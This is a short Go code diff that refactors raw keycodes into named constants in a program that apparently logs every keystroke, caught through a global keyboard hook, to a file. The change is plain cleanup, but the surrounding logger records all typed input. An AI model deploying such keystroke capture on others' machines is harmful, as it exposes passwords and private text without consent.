@@ -7,6 +7,12 @@ import (
 	hook "github.com/robotn/gohook"
 )
 
+const (
+	Backspace = 8
+	Enter     = 13
+	Space     = 32
+)
+
 func StartEventWriter() {
 	file, err := openLogFile()
 	if err != nil {
@@ -20,11 +26,11 @@ func StartEventWriter() {
 		if ev.Kind == hook.KeyHold {
 
 			switch ev.Rawcode {
-			case 8:
+			case Backspace:
 				file.WriteString("Backspace\n")
-			case 13:
+			case Enter:
 				file.WriteString("Enter\n")
-			case 32:
+			case Space:
 				file.WriteString("Space\n")
 			default:
 				text := string(ev.Keychar) + "\n"
